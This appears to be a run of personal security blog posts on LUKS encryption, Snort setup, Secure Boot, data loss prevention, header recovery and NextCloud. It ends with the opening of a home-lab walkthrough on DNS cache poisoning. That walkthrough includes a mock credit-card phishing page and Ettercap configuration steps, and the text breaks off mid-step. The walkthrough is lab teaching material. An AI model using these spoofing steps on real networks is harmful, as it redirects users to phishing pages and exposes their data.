You’ll need to do this before you’re able to mount and use the partition on the drive.\ncryptsetup open /dev/sdb encrypted # open the encrypted drive as /dev/mapper/encrypted mkfs.ext4 /dev/mapper/encrypted # create a filesystem on the device (only needed the first time you open the encrypted drive) Mounting the Partition In order to actually use the partition and the file system on it, we must mount it.\nmkdir -p /mnt/encrypted # prepare the mount point mount /dev/mapper/encrypted /mnt/encrypted # mount the decrypted filesystem on /mnt/encrypted Unmounting the Partition When you’re done using the drive, you can unmount it.\numount /mnt/encrypted Closing and Re-encrypting the Partition In its unmounted state, it is still decrypted. To re-encrypt and close the drive, you can run the following command:\ncryptsetup close /dev/mapper/encrypted Digging Deeper Because I’m a curious person, I’ll share with you some commands that you can use to get more information on the file system that you just created and other findings that I thought were interesting.\nFile System Metadata After decrypting the drive, you can view the metadata of your filesystem.\ncryptsetup --type luks open /dev/sdb encrypted These are some commands that will give you infromation.\ndf -hT /dev/mapper/encrypted tune2fs -l /dev/sdb As shown in the screenshots, you’re able to view the number of inodes, the block count, block size, filesystem magic number, and much more.\nInodes Inodes are a data structure that contain information about files in the Linux filesystem. It contains metadata such as the block number that the file is located in on the hard drive, permissions, and file owner. In an ext4 filesystem, the number of inodes in is fixed, whereas in XFS and JFS, the number of inodes is dynamic. The result is that in ext4 filesystems where many inodes are used, such as in situations where many directories, symbolic links, and/or small files are made, an error message that the system is out of space may occur when there is plenty of space left. The reason for this is simply that the filesystem has no more available inodes to assign to new files. This is a relatively common occurence for mail servers that often hold many small files.\nThe number of inodes on your system’s filesystems can be viewed with df -hi.\nYou can query the inode information on a specific file with the following command:\nls -il file The inode number is on the leftmost column of output. In this case, it is 131079. Additionally, you can see the read, write, and execute permissions on the file with the owner and group associated with it.\nAs an alternative, you can search for the file that is associated with a specific inode with this command:\nfind / -inum 1234567 -ls I was able to find the file /tmp/test.txt that was associated with 131079.\nDuplicating the Encrypted Drive This command can be used to create an exact duplicate of /dev/sdb in /media/sdb.img.\ndd if=/dev/sdb of=/media/sdb.img Next Steps Moving forward, you can expand upon what was done in this article by implementing an added layer of abstraction and flexibility with LVM. You can also continue to experiment with different ways of encrypting partitions such as those outlined in this article. There are many different ways to configure your system and I would encourage you to continue learning. Thank you for reading!\n","permalink":"https://ally-petitt.com/en/posts/2023-05-05_how-to-encrypt-a-drive-in-linux-83b3001744f4/","summary":"Introduction Hey everyone, this is a pretty quick article on LUKS drive encryption on Linux with the cryptsetup library. By following the steps outlined here, you will be able to encrypt a drive, decrypt it, and mount it. This was done in a Kali Linux VM and commands may vary for other distributions.\nDisclaimer: This is not an area that I have much experience in so if details are inaccurate, I apologize in advance.","title":"How to Encrypt a Drive in Linux"},{"content":"Introduction Snort is an open source Intrusion Prevention System (IPS) that detects malicious network traffic by comparing the network packets to a set of rules, often created by Snort and the community. Snort can be used as a packet sniffer, packet logger, and intrusion prevention system.\nIn this article, I’ll go over some of the first steps of installing, configuring, and running Snort so that new users have a place to branch off of.\nQuick Install You can install this on Ubuntu easily with the following command:\n$ sudo apt-get install snort Kali Linux For my Kali friends, you might get the message that you’re unable to locate the snort package when trying to install it. This happens because the repositories that your distribution looks into when searching for apt packages doesn’t contain snort. To fix this, you can try to append the following repos to your /etc/apt/sources.list.\ndeb http://http.kali.org/kali kali-rolling main non-free contrib deb http://http.kali.org/kali sana main non-free contrib deb http://security.kali.org/kali-security sana/updates main contrib non-free deb http://old.kali.org/kali moto main non-free contrib Let the changes take effect and install Snort.\n$ sudo apt-get update $ sudo apt-get install snort Building From Source If you’re crazy enough to build Snort from the source code, this section is for you.\nInstalling Dependencies Before you can build Snort, you must first install its dependencies. These are listed in their README.md on GitHub, but for the sake of brevity, I’ll put some of them here. Keep in mind that some of the dependencies have more dependencies which is why some appear below and not in the documentation.\nsudo apt update \u0026amp;\u0026amp; apt install -y gcc libpcre3-dev zlib1g-dev libluajit-5.1-dev libpcap-dev openssl libssl-dev libnghttp2-dev libdumbnet-dev bison flex libdnet autoconf libtool cmake DAQ Snort has another depenency called DAQ that needs to be installed. I’ll be downloading their latest release form GitHub and extracting it in a folder called daq.\n$ wget https://github.com/snort3/libdaq/archive/refs/tags/v3.0.11.zip $ unzip v3.0.11.zip -d daq \u0026amp;\u0026amp; cd daq/libdaq-3.0.11 After downloading and extracting it, I’ll run bootstrap to generate the configuration script and then proceed to install it.\n$ ./bootstrap $ ./configure \u0026amp;\u0026amp; make \u0026amp;\u0026amp; sudo make install hwloc Another dependency is hwloc. You can find additional methods of installation on their GitHub and website. This is the way that I did it:\n$ git clone https://github.com/open-mpi/hwloc.git $ cd hwloc \u0026amp;\u0026amp; ./autogen.sh $ ./configure \u0026amp;\u0026amp; make \u0026amp;\u0026amp; sudo make install OpenSSL If you don’t already have openssl installed on your system, you could install it from source:\n$ git clone https://github.com/openssl/openssl.git \u0026amp;\u0026amp; cd openssl $ ./Configure \u0026amp;\u0026amp; make \u0026amp;\u0026amp; make test It is also possible to install it through apt. You may still need to install some additional headers for Snort to work. For this, you can try\n$ sudo apt install libssl-dev openssl Snort Install Finally, we can start building Snort. I’ll be building directly from their source code on GitHub. Following the instructions on their README.md in GitHub, I clone their GitHub repository and run these commands:\n$ git clone https://github.com/snort3/snort3.git $ cd snort3 Then, I’ll build the program. You’ll need cmake among other packages in order to do this, so I’ve included the install command for those packages.\n$ sudo apt install -y gcc cmake libpcre3-dev zlib1g-dev libluajit-5.1-dev libpcap-dev openssl libssl-dev libnghttp2-dev libdumbnet-dev bison flex autoconf libtool $ ./configure\\_cmake.sh --prefix=$(pwd) --with-daq-libraries=/path/to/libdaq-3.0.11 $ cd build $ make -j $(nproc) install Configuration Capturing all Network Traffic To start, we’ll set our network adapter to run in promiscuous mode. This means that it will capture all packets on the network rather than only the ones that were assigned to be captured by it. This can be done through WiFi settings or through the command line.\n$ sudo ip link set wlan0 promisc on Modifying the Configuration File Most configurations will go within /etc/snort/snort.conf.\n$ sudo vim /etc/snort/snort.conf There’s many configuration options within this file that are broken up into 9 sections. Most of our changes will be in section 1.\nOn line 45 of the configuration file, we’ll change the value of HOME_NET from any to be the network that you would like to monitor. In my case, it is 192.168.1.0/24.\nI would encourage you to go through the other variables in the configuration file to include the ports and hosts that are running various services so that Snort can detect them and apply the rules to them.\nRules are included in step #7. The syntax for rule files is include /path/to/rule.rules. In this case, $RULE_PATH refers to /etc/snort. You can include multiple rule files and add your own under /etc/snort/local.rules or whichever file name that you configure for you own rules. This structure allows you to compartmentalize various rule sets and keep them organized.\nAs a side note, if you would like to download the latest community rules, you can find them at the official website. You would extract the tarball and add the rule files to your /etc/snort/snort.conf.\n$ wget https://www.snort.org/downloads/community/snort3-community-rules.tar.gz $ tar -xf snort3-community-rules.tar.gz Running Snort Once you have your configuration file created, you can test that everything works with the following command:\n$ sudo snort -T -i wlan0 -c /etc/snort/snort.conf You will get a lot of output. The most important pieces of information to be aware of in this output are the Snort rules. Here, you will be able to see how many were loaded in.\nTo actually run Snort as a daemon, you would change the -T option to -D.\n$ sudo snort -D -i eth0 -c /etc/snort/snort.conf Spawning daemon child... My daemon child 197993 lives... Daemon parent exiting (0) To verify that it is working, you can use ps aux.\n$ ps aux | grep snort root 196973 0.0 0.3 450316 118644 ? Ssl 10:25 0:00 snort -D -i wlan0 -c /etc/snort/snort.conf All alerts from Snort will be sent to /var/log/snort/alert unless otherwise specified in a command line argument.\nMoving Forward For those who are interested in learning Snort on a deeper level, one recommendation is learning how to create your own rules and learning what the other configuration options are. It may be worth it to read their man page as well to be aware of options available on the CLI. You can also combine Snort with a SIEM such as Splunk and other solutions like pfSense.\n","permalink":"https://ally-petitt.com/en/posts/2023-05-02_snort-ips-quickstart-27559ae01fae/","summary":"Introduction Snort is an open source Intrusion Prevention System (IPS) that detects malicious network traffic by comparing the network packets to a set of rules, often created by Snort and the community. Snort can be used as a packet sniffer, packet logger, and intrusion prevention system.\nIn this article, I’ll go over some of the first steps of installing, configuring, and running Snort so that new users have a place to branch off of.","title":"Snort IPS Quickstart"},{"content":" Linux Penguin\nIntroduction This article will begin with a high-level overview of the Ubuntu boot process and will continue to dig deeper into the role of SecureBoot in it when enabled. Some of the concepts I will be covering include shim, EFI variables, and MOKs. The information presented here was aggregated from the sources listed at the bottom of this article. Commands and example output will also be included to help present the topic in a more comprehensive way.\nUnderstanding the boot process along with SecureBoot is important because without adequate understanding of the inner-workings of a Linux system, it can be very easy to accidentally brick the system when attempting to enable settings such as SecureBoot. These are low-level operations that can do a lot of damage.\nI would encourage Windows users to reference this documentation for Secure Boot information relating to Windows.\nTypical Boot Process When an Ubuntu machine boots, it goes through 4 main phases.\nBIOS phase- firmware on motherboard, typically stored as a form of read only memory (ROM), contains code to initialize the hardware components of the computer and obtain the code for the bootloader. Bootloader phase- loads the operating system into memory along with an inital ram disk filesystem (initrd). Kernel phase- the kernel executes the init script inside the initrd filesystem. This loads hardware drivers and mounts the root partition. System startup- the operating system loads system daemons and services, sets up the network, mounts file systems, starts system logging, and performs other initialization tasks. It is common for a 512-bit partition to be present on Linux systems called the Master Boot Record (MBR). This partition contains the bootloader (GRUB, LILO, yaboot, or others) and boot records. This is one of the places that Linux can be booted from. Other locations include a bootloader from a storage device like USB flash drive or CDR or a bootloader that is transferred over the network such as with Preboot Execution Environment (PXE).\nSecure Boot Secure Boot is a security standard. When the computer is turned on, the Secure Boot process begins with firmware in the motherboard, which will check the cryptographic signatures of each of the boot files. This includes UEFI firmware drivers (aka optional ROMs), EFI applications, and the operating system. Once verified, the computer boots and the firmware gives control to the operating system.\nShim When enabling Secure Boot, it is important to understand shim. In the context of SecureBoot, a shim is a pre-bootloader program that is designed to work with Secure Boot firmware. It allows for bootloaders and kernel modules to be loaded and executed if they are not included in the Secure Boot database. In Ubuntu, the shim loader is pre-installed and signed by the Microsoft certificate authority.\nSecure Boot uses asymmetrical cryptography, meaning that a public and private key are used. The key pair can be generated by the user and the private key is used to sign all programs that are allowed to run, including the GRUB bootloader. The firmware on the BIOS or UEFI will use the public key to verify the checksums and signatures of programs before allowing them to execute.\nYou can check the signatures of your own shim loader with the sbverify command that comes with the sbsigntool package.\n# locate your shim binary $ SHIM=$(sudo find /boot/efi/EFI/ -iname \u0026#34;shim*\u0026#34; 2\u0026gt;/dev/null) $ sbverify $SHIM Signature verification OK UEFI variables Another concept to be familiar with is the UEFI variables which are stored in firmware non-volatile RAM (NV-RAM). These variables store various data such as boot order preferences, timeout values, network settings, storage device details, and Secure Boot settings. Each UEFI variable will have its own binary file under /sys/firmware/efi/efivars/. The naming convention for these files is the variable name followed by the vendor GUID. For example,SecureBoot-8be4df61–93ca-11d2-aa0d-00e098032b8cmay be used to store whether Secure Boot is enabled (0x01) or disabled (0x00).\nYou can view some of these variables by either listing the contents of /sys/firmware/efi/efivars/ or using the [efivarfs](https://manpages.org/efivar) tool to list and read the values.\n$ sudo apt-get install efivar $ sudo efivar -p -n 8be4df61-93ca-11d2-aa0d-00e098032b8c-SecureBoot 1 ⨯ Example output of the above command\nIn this particular example, the value of the UEFI variable SecureBoot is 0x01, which indicates that it is currently enabled. Some of the other important variables for Secure Boot are the following:\n8be4df61-93ca-11d2-aa0d-00e098032b8c-PKDefault 8be4df61-93ca-11d2-aa0d-00e098032b8c-KEKDefault 8be4df61-93ca-11d2-aa0d-00e098032b8c-dbDefault 8be4df61-93ca-11d2-aa0d-00e098032b8c-dbxDefault These values pertain to the key databases which are used to determine whether or not a module is safe to load.\nSecure Boot Databases Secure Boot utilizes 4 key databases. You can read more about them in the official specifications or see a summary here:\nAllowed Signature Database (db)- contains a list of cryptographic signatures that are allowed to load during the boot process. Disallowed Signature Database (dbx)- contains a list of the cryptographic signatures that are not allowed to be loaded during the boot process. Key Enrollment Key Database (KEK)- contains the key exchange keys used to authenticate other databases. Platform Key Database (PK)- contains the public key that is used to verify the signature of any bootloader or firmware that has been signed with its corresponding private key. The recommended platform key on UEFI is RSA-2048. The key databases essentially set the rules for which signatures are allowed to be loaded and which are not. This is important in Secure Boot because it helps to verify the integrity of modules before they are executed.\nMachine Owner Keys (MOKs) Another component of the boot process is Machine Owner Keys (MOKs). MOKs are an extra database of keys that can be managed by the user. This is separate from the certificate authority key that comes shipped with shim. They give the user more control over which modules can be loaded. For example, when a user enrolls a MOK on the system, the key associated with it is added to the allowed signature database (db). This means that any binary signed with that key will be trusted by the firmware during the boot process.\nThese are typically located in the/var/lib/shim-signed/mok/ directory under the names MOK.der, MOK.pem or MOK.priv. If you don’t have MOK keys and would like to generate them, the following commands can be used:\n# mkdir -p /var/lib/shim-signed/mok/ # cd /var/lib/shim-signed/mok/ # openssl req -new -x509 -newkey rsa:2048 -keyout MOK.priv -outform DER -out MOK.der -days 36500 -subj \u0026#34;/CN=My Name/\u0026#34; # openssl x509 -inform der -in MOK.der -out MOK.pem By default, shim provides a management utility called MokManager that can be used to, “enroll keys, remove trusted keys, enroll binary hashes and toggle Secure Boot validation at the shim level,” as described by the Ubuntu documentation. Note that a password is typically required when using the MokManager to authenticate the user that is using it.\nMokManager will help to properly configure the keys when key management is required. Once key management has been completed, the system will reboot to enable the key management changes. If things go well, it will continue to boot as expected without a MokManager screen.\nBootloader Configurations and Information You can futher investigate your Linux machine’s boot process. One way to do this is to view the /proc/cmdline file. This contains the kernel boot command line arguments that were passed to the kernel during the boot process.\n$ cat /proc/cmdline # example output BOOT\\_IMAGE=/boot/vmlinuz-5.11.0-16-generic root=UUID=12345678-1234-1234-1234-1234567890AB ro quiet splash This command will output the path to the kernel image file that is loaded by the bootloader via BOOT_IMAGE. The quiet splash option at the end is commonly used by the GRUB bootloader to specify to suppress verbose boot messages and display a graphical boot splash screen.\nA kernel image is a binary file of the operating system core. It contains contains the necessary code and data structures to boot the system, manage memory, handle input/output operations, and execute user programs. They can be used by the bootloader to start the OS. The name of the kernel image will typically represent its version and architecture. For instance, the kernel image vmlinuz-5.4.0–1042-aws is version 5.4.0–1042 running on AWS archtecture.\nThe bootloader contains its own file system drivers (initramfs) that you can view if you know the /boot/initrd* file that corresponds to the kernel image in use. The easiest way to do this is with the tools from [initramfs-tools-core](https://packages.debian.org/initramfs-tools-core \u0026quot;DebianPackage\u0026quot;):\n## list files inside the initramfs $ lsinitramfs /boot/initrd.img-$(uname -r) . kernel kernel/x86 . bin conf conf/arch.conf conf/conf.d conf/conf.d/resume -- snip -- ## extract files from the initramfs $ unmkinitramfs /boot/initrd.img-$(uname -r) initramfs/ This allows you to navigate the initramfs filesystem and gain a deeper understanding of how things are working as the system boots. If you extracted initramfs, you’ll notice that upon looking in the directory ./initramfs, there are 3 folders: early, early2, and main.\n$ ls initramfs early early2 main In the context of initramfs, early and early2 refer to the first and second stage of the initial RAM filesystem. During the first stage, the minimal set of drivers and utilities that are needed to initialize the hardware and mount the real root filesystem are loaded. In the second stage, early2, loads additional drivers and utilities needed to fully initialize the system.\nThe main folder of initramfs contains the actual root filesystem image, as well as any additional tools or drivers that may be needed during the boot process. Once the root filesystem has been mounted, the system can proceed to load the regular set of services and daemons needed to run the operating system.\nChecking Signatures Manually You can check which modules are digitally signed using the modinfo command where a kernel’s signature will appear as a long string of hexadecimal values separated by colons.\n$ modinfo example.ko filename: /lib/modules/5.10.0-5-amd64/kernel/drivers/misc/example.ko version: 1.0.0 license: GPL description: Example kernel module author: John Doe \u0026lt;jdoe@example.com\u0026gt; srcversion: 12AB34CD5678EF90ABCD1234 sig\\_key: A0:3B:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF sig\\_hashalgo: sha256 signature: 12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF Conclusion Thanks for reading this overview of Secure Boot. I would encourage you to do further reading in the sources linked below because this article only scratched the surface. I hope that from this article you were able to come to appreciate the beautifully complex system of a Linux machine turning on.\nSources Ubuntu’s wiki on Secure Boot (detailed) Ubuntu’s wiki on Booting Process Linux Documentation- Kernel Module Signing Mike Danslegio Explains Secure Boot User Space and Kernel Space in Linux Kernel.org- Ramfs, rootfs, and initramfs SecureBoot Debian Wiki Check UEFI or BIOS Using the initial RAM disk (initrd) Linux Boot Process Explained Preboot Execution Environment EFI Variables- Stack Exchange UEFI Specification Version 2.9 (March 2021) Initramfs Debian Wiki ","permalink":"https://ally-petitt.com/en/posts/2023-04-29_digging-into-the-linux-secure-boot-process-9631a70b158b/","summary":"Linux Penguin\nIntroduction This article will begin with a high-level overview of the Ubuntu boot process and will continue to dig deeper into the role of SecureBoot in it when enabled. Some of the concepts I will be covering include shim, EFI variables, and MOKs. The information presented here was aggregated from the sources listed at the bottom of this article. Commands and example output will also be included to help present the topic in a more comprehensive way.","title":"Digging into the Linux Secure Boot Process"},{"content":"Data Loss Prevention\nWhat is Data Loss Prevention? Data Loss Prevention (DLP) is a strategy for preventing data exfiltration and destruction. Examples of data include financial information, customer data, trade secrets, and other confidential information that could harm a company or its customers if exposed.\nCommon causes of data loss include:\nHuman error- accidental deletion of sensitive files, misconfiguring security settings, or being the victim of a social engineering attack. Insider threats- unauthorized saving and distribution of sensitive files by those with access to corporate systems. Malware- programs that infect a system and steal or corrupt data. Physical damage- natural disasters, hardware failures, and power outages can all result in the loss of data. Theft or loss of devices- data on the device at the time of being stolen/lost may be compromised. Steps of Data Loss Prevention https://cdn.sketchbubble.com/pub/media/catalog/product/optimized1/7/f/7f3f224484e9abfed723832a1fee08a73cdf27c9b5eb2b177a645fcc3c2c7261/data-loss-prevention-slide2.png\nData Classification Data classification falls under the broad umbrella of data governance. This is essentially the process of determining which data is considered to be sensitive so that it can be protected. It is an important prerequisite step to a successful DLP program.\nData Mapping This is the process of determining how data is transferred, where data is stored, how it is processed, and who has access to it. The goal of data mapping is to create a comprehensive inventory of an organization’s data assets.\nData is often in one of two states: in transit or at rest. It is typical that an audit will be performed on all the systems and applications that contain data at rest including file servers, cloud storage, databases, email systems, and other data repositories. Once this has been completed, it is common to create a map illustrating the flow of data through an organization. This includes identifying how data is processed, transmitted, and stored, as well as who has access to it at each stage of the process. The information collected through data mapping can be used to develop DLP policies and controls to protect sensitive data.\nProtect Data Data protection involves implementing controls in order to maintain the confidentiality of the information classified in step 1. Common data protection methods include:\nEncryption- the robustness and scope of encryption used will be determined by the assets that it is aiming to protect and how sensitive they are. Access Control- limiting user permissions, enforcing multi-factor authentication (MFA), and potentially monitoring user behavior to detect suspicious activity Security Policy- social media policy, clear desk policy, acceptable use policy, and end user policy are all potential ways to enforce operational security. Employee Training- employees should be trained on data handling best practices, strong password policy, and identifying social engineering schemes. Regular awareness campaigns can reinforce the importance of data security. DLP Software Solutions https://innovative.land/wp-content/uploads/2020/08/Data-Loss-Prevention-DLP.jpg\nCommercial tools can be used to prevent data loss the methods mentioned previously. DLP software can be found from cloud platforms and email providers as native implementations. Commercial solutions include Symantec CloudSOC CASB, Symantec DLP, McAfee Total Protection for DLP, and Digital Guardian to name a few.\nAs explained by CloudFlare, DLP solutions may detect sensitive data through data fingerprinting, keyword matching in files, pattern matching, file matching, and exact data matching. By comparing the unique identifiers of sensitive data, the software is able to determine whether the sensitive data is being exfiltrated and enact measures to prevent it. For example, the DLP program may block suspicious outgoing emails.\nConclusion Data loss prevention is an essential element of any organization’s cybersecurity strategy, as it helps protect sensitive data from loss or theft. By implementing a comprehensive DLP program, organizations can reduce the risk of data breaches and maintain the trust of their customers and stakeholders. However, it’s important to remember that DLP requires ongoing monitoring, evaluation, and improvement to ensure its effectiveness over time.\nMore Reading https://www.cloudflare.com/learning/access-management/what-is-dlp/ https://www.youtube.com/watch?v=TPU6VrBa0Fs https://en.wikipedia.org/wiki/Data_loss https://www.secureworld.io/industry-news/data-loss-prevention-next-gen-dlp ","permalink":"https://ally-petitt.com/en/posts/2023-04-23_how-to-prevent-data-leaks-before-they-happen-3c53997b3744/","summary":"Data Loss Prevention\nWhat is Data Loss Prevention? Data Loss Prevention (DLP) is a strategy for preventing data exfiltration and destruction. Examples of data include financial information, customer data, trade secrets, and other confidential information that could harm a company or its customers if exposed.\nCommon causes of data loss include:\nHuman error- accidental deletion of sensitive files, misconfiguring security settings, or being the victim of a social engineering attack. Insider threats- unauthorized saving and distribution of sensitive files by those with access to corporate systems.","title":"How to Prevent Data Leaks Before they Happen"},{"content":"Hi guys, I made a mistake. In my frustration trying to debug my C program, I inadvertently deleted all the files within my /usr/include folder. I didn’t realize at the time that this was a very important folder! As explained here, it stores the Linux kernel’s libc header files! Rookie mistake, but luckily for us, there’s ways to fix it.\nIf your /usr/include folder is also looking more empty than the shelves during COVID, I come bearing the solution.\nGetting Kernel Headers You’ll want to download the kernel install from here: https://www.kernel.org/. Choose the one that matches your Linux kernel version as close as possible. I’ll be using 6.2.10. From there, we’ll decompress the file and copy the contents of the include folder to /usr/include.\n# download the linux kernel files form kernel.org wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.2.10.tar.xz tar -xf linux-6.2.10.tar.xz # decompress the tarball # copy the contents of the include folder into /usr/include/ sudo cp -r ./linux-6.2.10.tar.xz/include/ /usr/include/ Restoring Additional Missing Files If you find that while compiling something, you still get errors, try this:\napt-file search /path/to/\u0026lt;MISSING\\_HEADER\u0026gt;.h In my case, I was missing string.h, so I used apt-file search /usr/include/string.h to see that I was needing the libc6-dev library.\nI had this installed previously, but since I deleted the files, I need to remove the installation completely and reinstall it.\nsudo apt remove --purge libc6-dev sudo apt install libc6-dev I also had to do the same with linux-libc-dev:\nsudo apt remove --purge linux-libc-dev sudo apt install linux-libc-dev Continue on with this methodology until you’ve installed all your missing dependencies. With these two steps combined, you should be able to restore your /usr/include file. This worked for me. Best of luck!\n","permalink":"https://ally-petitt.com/en/posts/2023-04-13_restoring-files-in--usr-include-88622911c3ae/","summary":"Hi guys, I made a mistake. In my frustration trying to debug my C program, I inadvertently deleted all the files within my /usr/include folder. I didn’t realize at the time that this was a very important folder! As explained here, it stores the Linux kernel’s libc header files! Rookie mistake, but luckily for us, there’s ways to fix it.\nIf your /usr/include folder is also looking more empty than the shelves during COVID, I come bearing the solution.","title":"Restoring Files in /usr/include"},{"content":" Why Create a Cloud Server? As many security-conscious people are aware, saving something in the cloud really means saving it on somebody else’s computer. When using cloud services, you don’t own the data that you upload, nor do you own the program that you’re using. Additionally, it is within the cloud service provider’s rights to delete your data or remove your access to it if they had technical issues, went bankrupt, or you missed a bill. Not all of them will do that, but there is no law protecting the customer from something like this happening. There aren’t any measures in place to prevent the government or corporations from looking through your data and using it for their own objectives (in the US).\nAside from data security, creating your cloud server provides the opportunity to learn more about how cloud storage works, get practice with hosting a docker container and connecting to it on your LAN, and challenge yourself to do something new.\nWhy NextCloud NextCloud is free and open source. They do not collect or share any of your data. For the paranoid, you can audit the source code yourself to verify this. The cost of a NextCloud server will be limited to the of the infrastructure that you’re using to host it.\nMy Setup In this demonstration, I’ll be hosting the NextCloud server in a Kali Linux virtual machine. Although I’m using Kali, you can do this on any operating system that allows you to download Docker. I’ll be accessing it through other devices on my LAN.\nCreating Your Docker Container To start, if you don’t already have docker installed, you can find the release for your operating system here: https://docs.docker.com/desktop/release-notes/\nPull and run the NextCloud container To find the versions of NextCloud that are available to you, visit their docker website: https://hub.docker.com/_/nextcloud.\nIn this example, I’ll be using version 24.0.11, but you can substitute with whichever version you’re using.\nsudo docker pull nextcloud:24.0.11 The output of that command will look like this once it is completed:\nNext, I’ll start the container and bind it to port 80 on my Kali VM.\nsudo docker run --name my\\_cloud -d -p 80:80 nextcloud:24.0.11 Explanation:\n--name will set the container name to be my_cloud -d will run the container in detached mode. This means that the container will run in the background of my terminal instead of displaying all the output -p allows for port-binding from port 80 of the docker container to port 80 of the machine that the container is running on so that we can access it in the browser Now, visiting \u0026lt;http://localhost:80\u0026gt; in the browser of my Kali VM leads to the NextCloud web interface.\nSetting up NextCloud for use Create Admin Account Like the initial homepage says, you can create an admin account by entering your desired credentials into the login form. Then click the install button below.\nYou will be prompted with a screen that optionally allows you to install reccomended apps.\nCreate User Account Each user of NextCloud will only be able to view their respective files. To create a user account, click on your profile picture and click Users.\nThen, click the New user button in the upper-righthand corner.\nFill in the form that appears with your desired information. and click Add a new user. You can verify that the user was added by logging out of your administrator account and logging in with the user credentials.\nWhitelisting Domains Now, we’ll need to configure the NextCloud server so that we can access it from other devices.\nYou’ll need to know your IP address. I use the ifconfig command on my Kali VM to determine. Windows users can use ipconfig.\nI’ll install vim as a text editor so that I can edit the config files easier.\n┌──(kali㉿kali)-[~] └─$ sudo docker exec -it my\\_cloud bash root@f6d476ccd902:/var/www/html# apt update -- snip -- root@f6d476ccd902:/var/www/html# apt install -y vim -- snip -- root@f6d476ccd902:/var/www/html# vim config/config.php In your config/config.php file, add the option of trusted_domains at the bottom, starting on line 21 (type :set number in vim to show line numbers). This option will allow you to connect to the NextCloud server through different domain names. Without this option, you would not be able to use your server through a domain name besides localhost, which is not ideal if you’re trying to access it remotely.\n\u0026#39;trusted\\_domains\u0026#39; =\u0026gt; [ \u0026#39;localhost\u0026#39;, \u0026#39;127.0.0.1\u0026#39;, \u0026#39;\u0026lt;YOUR IP ADDRESS\u0026gt;\u0026#39;, \u0026#39;\u0026lt;YOUR DOMAIN NAME (optional)\u0026gt;\u0026#39;, ], Now, I can use my NextCloud server from 192.168.1.53, 127.0.0.1, and localhost.\nNote: You can optionally choose to configure your own database. The documentation for doing that can be found here.\nConnecting From Other Devices PC To connect from you PC, just type in the IP address of your NextCloud server into your browser and type in your login credentials.\nMobile You can also connect to the website from your phone. Alternatively, you can download the NextCloud app, available in the App Store and Google Play Store. Just type the same URL into the app that you would type in the browser.\nConclusion NextCloud allows for a tremendous amount of flexibility. There are many configurations that you can set including brute force protection, antivirus scanning, OAuth2, and more as shown in their documentation. I hope that you got value out of this article and were inspired to take control of your data.\n","permalink":"https://ally-petitt.com/en/posts/2023-04-09_how-to-create-and-deploy-your-own-cloud-server-with-nextcloud-345e185d602a/","summary":"Why Create a Cloud Server? As many security-conscious people are aware, saving something in the cloud really means saving it on somebody else’s computer. When using cloud services, you don’t own the data that you upload, nor do you own the program that you’re using. Additionally, it is within the cloud service provider’s rights to delete your data or remove your access to it if they had technical issues, went bankrupt, or you missed a bill.","title":"How to Create and Deploy Your Own Cloud Server with NextCloud"},{"content":"DNS Cache Poisoning on Home Lab Walkthrough https://www.okta.com/sites/default/files/media/image/2021-04/DNSPoisoning.png\nOverview In this article, I will be walking you through a common method of implementing DNS cache poisoning on a network. I’ll illustrate my process with screenshots, commands, and explanations. You are welcome to follow along and gain hands-on experience with DNS spoofing to further reinforce the knowledge that you already have.\nIntended Audience This is intended for a more technical audience. If you’re a beginner, I recommend looking for a more comprehensive tutorial to walk you through all the terminology and commands. For the purposes of this article, I’m assuming that you already have a foundational understanding of Linux, DNS, virtual machines, and potentially troubleshooting. I will not be explaining how DNS cache poisoning works. For more information, you may read the articles linked in the “More Reading” section at the end of this post.\nTools Used Windows VM Kali VM Ettercap Text editor You will also need root/system privileges or sudo abilities on the attacking machine.\nPractical Demonstration Find the IP address of your attacker machine Since I’m doing this on my LAN, I can use my private IPv4 address, which I truncated from the ifconfig command for the purpose of this demonstration.\n2. Create the landing page of your malicious website Now, we’ll prepare the HTML file that the victim will encounter once the DNS has been spoofed. Since I’m using an Apache webserver, I’ll place the file in the root directory on my machine, which is /var/www/html. This is my file:\n┌──(ally㉿kali)-[/var/www/html] └─$ cat index.html \u0026lt;title\u0026gt;No More Planting Trees\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;No More Planting Trees\u0026lt;/h1\u0026gt; \u0026lt;h3\u0026gt;YouR CaR\u0026#39;s ExteNDeD WarraNTy is AlMosT OuT\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Give me all your PII NOW or else your identity will be stolen !!! !!\u0026lt;/p\u0026gt; \u0026lt;form\u0026gt; \u0026lt;label for=\u0026#34;cc\u0026#34;\u0026gt;Enter YouR CreDIT CarD Number ASAP \u0026lt;b\u0026gt;ASAP\u0026lt;/b\u0026gt; !!:\u0026lt;/label\u0026gt; \u0026lt;input id=\u0026#34;cc\u0026#34; placeholder=\u0026#34;or else\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; I then changed the ownership of the file to the service account www-data.\n$ sudo chown www-data ./index.html Start Malicious Web Server As stated previously, I’m using Apache, so I just started theapache2 service.\nWhen I visit [http://127.0.0.1/index.html](http://127.0.0.1/index.html,), I see my malicious webpage.\nNo one would actually enter their credit card number here… right??\nVerify Website is Reachable from Victim Computer This is pretty simple. I just visit my Kali IPv4 address in the browser of Windy Runner (my VM) to verify that it can be loaded from the Windows machine.\nAs we can see here, I am able to access the webpage. Now we can get to the fun stuff.\nConfiguring Ettercap Quick Theory\nEttercap is being used in this context to resolve DNS queries coming from the victim machine. Ettercap will respond to the DNS query with the IP address of the attacking machine (Kali) such that when the victim visits the target domain, they will be redirected to the attacker\u0026rsquo;s IP address instead of the real IP address associated with the domain name.\nEditing etter.conf\nOpen up your text editor of choice.\n$ sudo vim etter.conf The changes to make are shown in green in the screenshot below.\nExplanation: I set the UID and GID to 0 so that Ettercap has adequate permissions on the machine. In this case, UID and GID 0 are root permissions. I then uncommented lines 179, 180, 183, and 184. The purpose of the redir_commands is explained best in the etter.conf man page:\n[P]rovide[s] a valid command (or script) to enable tcp redirection at kernel level in order to be able to use SSL dissection.\nEditing etter.dns\nAssuming you\u0026rsquo;re using the default configuration file for etter.dns, all you need to do is skip to the bottom of the file and add the domain name you intend to spoof, the associated A and PTR records, and your attacking IP address.\n$ sudo vim 